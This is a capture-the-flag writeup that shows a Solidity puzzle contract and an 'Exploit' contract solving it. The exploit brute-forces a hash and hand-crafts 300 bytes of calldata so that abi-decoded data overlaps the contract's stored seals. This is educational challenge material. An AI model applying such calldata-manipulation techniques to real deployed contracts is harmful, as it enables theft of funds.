---
title: Encoded Spell CTF Writeup
description: >-
  Solution to the Wonderland CTF 2026 challenge
categories: [CTF]
tags: [technical]
pin: false
image:
  path: /assets/img/cure.jpg
---

## Challenge

Here's the challenge if you want to try it yourself:

> Powerful spells require intricate incantations. Only well-versed mages can unleash the power of ancient runes.

```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

struct Spell {
    string name;
    bytes32[8] enchantments;
}

contract Challenge {
    bool        public unleashed;
    uint256     public mana;
    bytes32     public masterSeal;
    bytes32[8]  public weakSeals;

    constructor(address) {}

    function createMagicCircle(string calldata runes, bytes32 newMasterSeal) external {
        mana = msg.data.length;
        masterSeal = newMasterSeal;
        weakSeals = abi.decode(bytes(runes), (bytes32[8]));
    }

    function cast(Spell calldata spell) external {
        // Spells in the Grimoire
        bytes32 secretSpellName = keccak256(bytes(spell.name));
        require(
            (secretSpellName == keccak256("CURE")   && mana == 100) ||
            (secretSpellName == keccak256("CURA")   && mana == 200) ||
            (secretSpellName == keccak256("CURAGA") && mana == 300) ||
            (secretSpellName == keccak256("ULTIMA") && mana == 6e66)
        );

        // Each weak seal must be broken by a powerful enchantment
        for (uint i; i < weakSeals.length; i++) {
            bool brokenSeal = spell.enchantments[i] > weakSeals[i];
            require(brokenSeal);
        }

        // The power balance of the spell must match the one of the master seal
        require(keccak256(abi.encode(spell)) == masterSeal);

        // The full power of the spell is unleashed
        unleashed = true;
    }

    function isSolved() external view returns (bool) {
        return unleashed;
    }
}
```

## Solution

```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "src/Challenge.sol";

contract Exploit {
    Challenge private immutable CHALLENGE;
    bytes32 MAX = bytes32(type(uint).max);

    constructor(Challenge challenge) {
        CHALLENGE = challenge;
    }

    function exploit() external {
        Spell memory spell;
        bytes32 masterSeal;
        bytes1 sharedByte;

        for (uint i = type(uint).max; i > 0; i--) {
            spell = Spell("CURAGA", [bytes32(i), MAX, MAX, MAX, MAX, MAX, MAX, MAX]);
            bytes memory encodedSpell = abi.encode(spell);
            assembly {
                mstore(add(encodedSpell, 0x160), 0) // MAGIC
            }
            masterSeal = keccak256(encodedSpell);
            sharedByte = masterSeal[0];

            // The last byte of weakSeals.length overlaps with the first byte of masterSeal
            if (sharedByte <= 0x07) {
                break;
            }
        }

        // The first of the weakSeals overlaps with the masterSeal with a 1-byte offset
        bytes32 firstWeakSeal = bytes32(masterSeal) << 8;
        bytes32[8] memory weakSeals = [firstWeakSeal, 0, 0, 0, 0, 0, 0, 0];

        // Pack the calldata so that it fits in 300 bytes
        bytes memory init = hex"0000000000000000000000000000000000000000000000000000000000000001";
        bytes memory end = hex"00000000000000";
        bytes memory data = abi.encodePacked(CHALLENGE.createMagicCircle.selector, init, sharedByte, weakSeals, end);

        (bool ok,) = address(CHALLENGE).call(data);
        require(ok, "Magic Circle Failed");
        CHALLENGE.cast(spell);

        require(CHALLENGE.isSolved(), "Challenge not solved");
    }
}
```
